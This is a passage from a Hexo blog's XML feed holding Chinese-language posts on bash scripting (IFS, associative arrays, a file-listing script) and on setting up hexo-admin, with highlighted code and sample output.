&amp;&amp; <span class="variable">$2</span> != <span class="string">&#x27;-&#x27;</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">FEATURE=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;BASE_PATH: <span class="variable">$BASE_PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;FEATURE: <span class="variable">$FEATURE</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -a files</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件遍历</span></span><br><span class="line"><span class="keyword">function</span> file_traverse &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;-----------------------------------------&quot;</span></span><br><span class="line">    IFS=$<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="comment">#echo -n &quot;$IFS&quot; | od -b</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    files=($(find <span class="variable">$BASE_PATH</span> -name <span class="string">&quot;<span class="variable">$FEATURE</span>&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> str <span class="keyword">in</span> <span class="variable">$&#123;!files[@]&#125;</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$str</span>\t<span class="variable">$&#123;files[$str]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件选择</span></span><br><span class="line"><span class="keyword">function</span> choose_file &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;-----------------------------------------&quot;</span></span><br><span class="line">    <span class="built_in">read</span> -p <span class="string">&quot;请通过序号选择文件：&quot;</span> ids</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;你选择的序号为：<span class="variable">$&#123;ids[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    IFS=$<span class="string">&#x27; \t&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> id <span class="keyword">in</span> <span class="variable">$&#123;ids[@]&#125;</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$id</span> -lt <span class="variable">$&#123;#files[@]&#125;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;文件: &quot;</span><span class="variable">$&#123;files[$id]&#125;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_traverse</span><br><span class="line">choose_file</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-脚本输出"><a href="#2-脚本输出" class="headerlink" title="2. 脚本输出"></a>2. 脚本输出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/</span><br><span class="line">BASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/</span><br><span class="line">FEATURE: *.md</span><br><span class="line">yerba-buena:shell yeshaoting$ sh print_blog_file.sh /Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/</span><br><span class="line">BASE_PATH: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/</span><br><span class="line">FEATURE: *.md</span><br><span class="line">-----------------------------------------</span><br><span class="line">0/Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/shell关联数组基本用法.md</span><br><span class="line">1/Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/了解IFS.md</span><br><span class="line">2/Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/遍历博客文章.md</span><br><span class="line">-----------------------------------------</span><br><span class="line">请通过序号选择文件：2 0</span><br><span class="line">你选择的序号为：2 0</span><br><span class="line">文件: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/遍历博客文章.md</span><br><span class="line">文件: /Users/yeshaoting/java/workspace/github/hexo-blog/<span class="built_in">source</span>/_posts/article/shell/shell关联数组基本用法.md</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/bash.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、脚本说明&quot;&gt;&lt;a href=&quot;#一、脚本说明&quot; class=&quot;headerlink&quot; title=&quot;一、脚本说明</summary>
      
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="shell" scheme="http://yeshaoting.cn/tags/shell/"/>
    
    <category term="实践" scheme="http://yeshaoting.cn/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>了解IFS</title>
    <link href="http://yeshaoting.cn/article/shell/%E4%BA%86%E8%A7%A3IFS/"/>
    <id>http://yeshaoting.cn/article/shell/%E4%BA%86%E8%A7%A3IFS/</id>
    <published>2016-02-01T09:37:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/bash.png" class="img-logo img-center" /><h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>内部字段分隔符IFS用作文本分隔符，用于将分隔文本成一个个词。默认的分隔符为空格、制表符以及换行。</p><p>通过命令<code>man bash</code>可以查看到bash的帮助文档，其中有一段内容如下：</p><blockquote><p>The Internal Field Separator that is used for word splitting after expansion and to  split lines into words with the read builtin command.<br>The default value is <code>&lt;space&gt;&lt;tab&gt;&lt;newline&gt;</code>.</p></blockquote><h2 id="二、相关知识"><a href="#二、相关知识" class="headerlink" title="二、相关知识"></a>二、相关知识</h2><h3 id="1-IFS内容查看"><a href="#1-IFS内容查看" class="headerlink" title="1. IFS内容查看"></a>1. IFS内容查看</h3><p>由于IFS默认包含的字符都是非可见字符，所以需要将字符内容转换成ASCII码或者八进制等查看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$IFS</span> | od -a (Output named characters.)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$IFS</span> | od -b (Output octal bytes.)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$IFS</span> | od -c (Output C-style escaped characters.)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$IFS</span> | od -x (Output hexadecimal bytes.)</span><br></pre></td></tr></table></figure><h3 id="2-自定义IFS"><a href="#2-自定义IFS" class="headerlink" title="2. 自定义IFS"></a>2. 自定义IFS</h3><p>一般情况，修改IFS只需给IFS这个全局变量赋值即可。<br>例如：设置默认分隔符为冒号<code>IFS=.</code></p><p>特别地，对于空格、\n，\t等特殊字符或转义字符需要进行转义处理，如：<code>IFS=$&#39;\n&#39;</code>。</p><h2 id="三、应用实例"><a href="#三、应用实例" class="headerlink" title="三、应用实例"></a>三、应用实例</h2><h3 id="1-脚本"><a href="#1-脚本" class="headerlink" title="1. 脚本"></a>1. 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;172.30.29.173&quot;</span></span><br><span class="line">arr=(<span class="variable">$str</span>)</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;默认分隔&gt;&gt; 长度：<span class="variable">$&#123;#arr[@]&#125;</span> 内容：<span class="variable">$&#123;arr[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">IFS=.</span><br><span class="line">arr=(<span class="variable">$str</span>)</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;冒号分隔&gt;&gt; 长度：<span class="variable">$&#123;#arr[@]&#125;</span> 内容：<span class="variable">$&#123;arr[@]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">str=<span class="string">&quot;172 30.29 173&quot;</span></span><br><span class="line">IFS=$<span class="string">&#x27; &#x27;</span></span><br><span class="line">arr=(<span class="variable">$str</span>)</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;空格分隔&gt;&gt; 长度：<span class="variable">$&#123;#arr[@]&#125;</span> 内容：<span class="variable">$&#123;arr[@]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-输出"><a href="#2-输出" class="headerlink" title="2. 输出"></a>2. 输出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:tmp yeshaoting$ sh ifs.sh</span><br><span class="line">默认分隔&gt;&gt; 长度：1 内容：172.30.29.173</span><br><span class="line">冒号分隔&gt;&gt; 长度：4 内容：172 30 29 173</span><br><span class="line">空格分隔&gt;&gt; 长度：3 内容：172 30.29 173</span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><ol><li><a href="http://smilejay.com/2011/12/bash_ifs/">SHELL中的IFS详解</a></li><li><a href="http://www.1987.name/205.html">[Shell学习笔记] 内部字段分隔符IFS、脚本调试DEBUG</a></li><li><a href="http://blog.csdn.net/whuslei/article/details/7187639">Shell中的IFS解惑</a></li><li><a href="http://unix.stackexchange.com/questions/184863/what-is-the-meaning-of-ifs-n-in-bash-scripting">What is the meaning of IFS=$’\n’ in bash scripting ?</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/bash.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、介绍&quot;&gt;&lt;a href=&quot;#一、介绍&quot; class=&quot;headerlink&quot; title=&quot;一、介绍&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="shell" scheme="http://yeshaoting.cn/tags/shell/"/>
    
    <category term="实践" scheme="http://yeshaoting.cn/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>hexo使用进阶</title>
    <link href="http://yeshaoting.cn/article/hexo/hexo%E4%BD%BF%E7%94%A8%E8%BF%9B%E9%98%B6/"/>
    <id>http://yeshaoting.cn/article/hexo/hexo%E4%BD%BF%E7%94%A8%E8%BF%9B%E9%98%B6/</id>
    <published>2016-02-01T05:25:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/hexo.png" title="hexo" class="img-logo img-center" /><h2 id="一、后端管理插件hexo-admin"><a href="#一、后端管理插件hexo-admin" class="headerlink" title="一、后端管理插件hexo-admin"></a>一、后端管理插件hexo-admin</h2><p>插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。<br>另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。</p><p>参见：</p><ul><li><a href="http://jaredforsyth.com/hexo-admin/">An Admin Interface for Hexo</a></li><li><a href="https://github.com/jaredly/hexo-admin">hexo-admin in github</a></li></ul><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br><span class="line">hexo server -d</span><br><span class="line">open http://localhost:4000/admin/</span><br></pre></td></tr></table></figure><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h3><p>在_config.yml最后添加类似如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin:</span><br><span class="line">  username: myfavoritename</span><br><span class="line">  password_hash: be121740bf988b2225a313fa1f107ca1</span><br><span class="line">  secret: a secret something</span><br></pre></td></tr></table></figure><p>username：后端登录用户名<br>password_hash：后端登录用户密码对应的md5 hash值<br>secret：用于保证cookie安全</p><h3 id="3-预览"><a href="#3-预览" class="headerlink" title="3. 预览"></a>3. 预览</h3><p>hexo-admin界面如下：<br><img src="https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true" alt="screenshot-1"><br><img src="https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png" alt="screenshot-2"></p><span id="more"></span><h2 id="二、Error-with-DTrace"><a href="#二、Error-with-DTrace" class="headerlink" title="二、Error with DTrace"></a>二、Error with DTrace</h2><p>mac下默认安装使用hexo会报如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; [Error: Cannot find module <span class="string">&#x27;./build/Release/DTraceProviderBindings&#x27;</span>] code: <span class="string">&#x27;MODULE_NOT_FOUND&#x27;</span> &#125;</span><br><span class="line">&#123; [Error: Cannot find module <span class="string">&#x27;./build/default/DTraceProviderBindings&#x27;</span>] code: <span class="string">&#x27;MODULE_NOT_FOUND&#x27;</span> &#125;</span><br><span class="line">&#123; [Error: Cannot find module <span class="string">&#x27;./build/Debug/DTraceProviderBindings&#x27;</span>] code: <span class="string">&#x27;MODULE_NOT_FOUND&#x27;</span> &#125;</span><br></pre></td></tr></table></figure><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo --no-optional</span><br></pre></td></tr></table></figure><p>参见：<a href="https://hexo.io/docs/troubleshooting.html#Error_with_DTrace__28Mac_OS_X_29">Error with DTrace (Mac OS X)</a></p><h2 id="三、hexo不支持的语法"><a href="#三、hexo不支持的语法" class="headerlink" title="三、hexo不支持的语法"></a>三、hexo不支持的语法</h2><p>发现一例hexo不支持的行内代码语法：外层内容<code>$&#123;&#125;</code>，内层内容以<code>#</code>开头。<br>但是支持多行代码块，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;#arr[@]&#125;</span></span><br><span class="line"><span class="variable">$&#123;#arr[*]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="四、多分类支持不友好"><a href="#四、多分类支持不友好" class="headerlink" title="四、多分类支持不友好"></a>四、多分类支持不友好</h2><p>如果文章A设置有二个分类如：linux, shell(有先后顺序)，另一篇文章B设置有分类如：shell, bash(有先后顺序)。<br>在分类里会生成四个分类linux(categories/linux), shell(categories/linux/shell), shell(categories/shell), bash(categories/shell/bash)。</p><p>由此可见，对于一篇文章最好只设置一个分类，设置多个标签。</p><h2 id="五、文章更新时间显示"><a href="#五、文章更新时间显示" class="headerlink" title="五、文章更新时间显示"></a>五、文章更新时间显示</h2><p>修改只对于jacman主题而言。</p><h3 id="1-添加文章更新时间显示位置"><a href="#1-添加文章更新时间显示位置" class="headerlink" title="1. 添加文章更新时间显示位置"></a>1. 添加文章更新时间显示位置</h3><p>文件：layout/_partial/post/header.ejs<br>在article-time块内添加如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">time</span> <span class="attr">postupdated</span>=<span class="string">&quot;&lt;%= date_xml(item.updated) %&gt;&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;dateModified&quot;</span>&gt;</span> &lt;%= __(&#x27;dateModified&#x27;) %&gt; &lt;%= item.updated.format(config.date_format) %&gt;<span class="tag">&lt;/<span class="name">time</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-添加支持"><a href="#2-添加支持" class="headerlink" title="2. 添加支持"></a>2. 添加支持</h3><p>文件：languages/zh-CN.yml<br>在最后添加如下内容：</p><blockquote><p>dateModified: 更新于</p></blockquote><p>参见：</p><ul><li><a href="https://hexo.io/zh-cn/docs/internationalization.html">hexo国际化（i18n）</a></li><li><a href="https://blog.mcosx.cn/post/hexo-jacman/">hexo之jacman主题修改记录</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/hexo.png&quot; title=&quot;hexo&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、后端管理插件hexo-admin&quot;&gt;&lt;a href=&quot;#一、后端管理插件hexo-admin&quot; class=&quot;headerlink&quot; title=&quot;一、后端管理插件hexo-admin&quot;&gt;&lt;/a&gt;一、后端管理插件hexo-admin&lt;/h2&gt;&lt;p&gt;插件可以直接在网页端创建、编辑markdown文章内容，并将内容发布到_posts里。&lt;br&gt;另外，对我而言，最方便的是可以很方便的给文章加标题、分类、打标签。&lt;/p&gt;
&lt;p&gt;参见：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://jaredforsyth.com/hexo-admin/&quot;&gt;An Admin Interface for Hexo&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/jaredly/hexo-admin&quot;&gt;hexo-admin in github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;1-安装&quot;&gt;&lt;a href=&quot;#1-安装&quot; class=&quot;headerlink&quot; title=&quot;1. 安装&quot;&gt;&lt;/a&gt;1. 安装&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install --save hexo-admin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo server -d&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;open http://localhost:4000/admin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-配置&quot;&gt;&lt;a href=&quot;#2-配置&quot; class=&quot;headerlink&quot; title=&quot;2. 配置&quot;&gt;&lt;/a&gt;2. 配置&lt;/h3&gt;&lt;p&gt;在_config.yml最后添加类似如下内容：&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;admin:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  username: myfavoritename&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  password_hash: be121740bf988b2225a313fa1f107ca1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  secret: a secret something&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;username：后端登录用户名&lt;br&gt;password_hash：后端登录用户密码对应的md5 hash值&lt;br&gt;secret：用于保证cookie安全&lt;/p&gt;
&lt;h3 id=&quot;3-预览&quot;&gt;&lt;a href=&quot;#3-预览&quot; class=&quot;headerlink&quot; title=&quot;3. 预览&quot;&gt;&lt;/a&gt;3. 预览&lt;/h3&gt;&lt;p&gt;hexo-admin界面如下：&lt;br&gt;&lt;img src=&quot;https://github.com/jaredly/hexo-admin/raw/master/docs/pasted-0.png?raw=true&quot; alt=&quot;screenshot-1&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/jaredly/hexo-admin/master/docs/pasted-1.png&quot; alt=&quot;screenshot-2&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="博客搭建" scheme="http://yeshaoting.cn/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="hexo" scheme="http://yeshaoting.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>shell关联数组基本用法</title>
    <link href="http://yeshaoting.cn/article/shell/shell%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"/>
    <id>http://yeshaoting.cn/article/shell/shell%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/</id>
    <published>2016-02-01T04:35:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/bash.png" class="img-logo img-center" /><p><strong>注</strong>：bash自版本4后才开始支持关联数组，之前的版本可以考虑通过二维数组来代替。</p><h2 id="一、基本用法"><a href="#一、基本用法" class="headerlink" title="一、基本用法"></a>一、基本用法</h2><h3 id="1-数组声明"><a href="#1-数组声明" class="headerlink" title="1. 数组声明"></a>1. 数组声明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> -a arr</span><br></pre></td></tr></table></figure><h3 id="2-数组赋值"><a href="#2-数组赋值" class="headerlink" title="2. 数组赋值"></a>2. 数组赋值</h3><h4 id="静态赋值"><a href="#静态赋值" class="headerlink" title="静态赋值"></a>静态赋值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr=([A]=A1, [C]=C2, [E]=E3, [B]=B411, [b]=b5)</span><br></pre></td></tr></table></figure><h4 id="动态赋值"><a href="#动态赋值" class="headerlink" title="动态赋值"></a>动态赋值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arr[<span class="string">&quot;A&quot;</span>]=A1</span><br><span class="line">arr[<span class="string">&quot;C&quot;</span>]=C2</span><br><span class="line">arr[<span class="string">&quot;E&quot;</span>]=E3</span><br><span class="line">arr[<span class="string">&quot;B&quot;</span>]=B411</span><br><span class="line">arr[<span class="string">&quot;b&quot;</span>]=b5</span><br></pre></td></tr></table></figure><h3 id="3-数组遍历"><a href="#3-数组遍历" class="headerlink" title="3. 数组遍历"></a>3. 数组遍历</h3><h4 id="数组索引-键"><a href="#数组索引-键" class="headerlink" title="数组索引(键)"></a>数组索引(键)</h4><p>格式：<code>$&#123;!arr[@]&#125;</code> 或 <code>$&#123;!arr[*]&#125;</code></p><h4 id="数组内容-值"><a href="#数组内容-值" class="headerlink" title="数组内容(值)"></a>数组内容(值)</h4><p>格式：<code>$&#123;arr[@]&#125;</code> 或 <code>$&#123;arr[*]&#125;</code></p><h3 id="4-数组长度"><a href="#4-数组长度" class="headerlink" title="4. 数组长度"></a>4. 数组长度</h3><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;#变量&#125;</span></span><br></pre></td></tr></table></figure><p>该变量若为数组，则为数组长度；若为普通变量，则为普通变量长度。</p><p>数组长度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;#arr[@]&#125;</span></span><br><span class="line"><span class="variable">$&#123;#arr[*]&#125;</span></span><br></pre></td></tr></table></figure><p>数组元素长度：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;#arr[2]&#125;</span></span><br></pre></td></tr></table></figure><h3 id="5-子数组"><a href="#5-子数组" class="headerlink" title="5. 子数组"></a>5. 子数组</h3><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;#arr:index:end&#125;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="二、举例"><a href="#二、举例" class="headerlink" title="二、举例"></a>二、举例</h2><h3 id="1-实例脚本"><a href="#1-实例脚本" class="headerlink" title="1. 实例脚本"></a>1. 实例脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A arr</span><br><span class="line"></span><br><span class="line">arr[<span class="string">&quot;A&quot;</span>]=A1</span><br><span class="line">arr[<span class="string">&quot;C&quot;</span>]=C2</span><br><span class="line">arr[<span class="string">&quot;E&quot;</span>]=E3</span><br><span class="line">arr[<span class="string">&quot;B&quot;</span>]=B411</span><br><span class="line">arr[<span class="string">&quot;b&quot;</span>]=b5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组长度</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组长度$&#123;#arr[@]&#125;:\t&#x27;</span><span class="variable">$&#123;#arr[@]&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组长度$&#123;#arr[@]:1:4&#125;:\t&#x27;</span><span class="variable">$&#123;#arr[@]:1:4&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;单个元素长度$&#123;#arr[C]&#125;:\t&#x27;</span><span class="variable">$&#123;#arr[C]&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;单个元素长度$&#123;#arr[B]&#125;:\t&#x27;</span><span class="variable">$&#123;#arr[B]&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组索引$&#123;!arr[@]&#125;:\t&#x27;</span><span class="variable">$&#123;!arr[@]&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;全部数组内容$&#123;arr[@]&#125;:\t&#x27;</span><span class="variable">$&#123;arr[@]&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组子串</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组子串$&#123;arr[@]:2&#125;:\t&#x27;</span><span class="variable">$&#123;arr[@]:2&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组子串$&#123;arr[@]:1:4&#125;:\t&#x27;</span><span class="variable">$&#123;arr[@]:1:4&#125;</span>;</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组值</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;数组值$&#123;arr[b]&#125;:\t&#x27;</span><span class="variable">$&#123;arr[b]&#125;</span>;</span><br><span class="line"><span 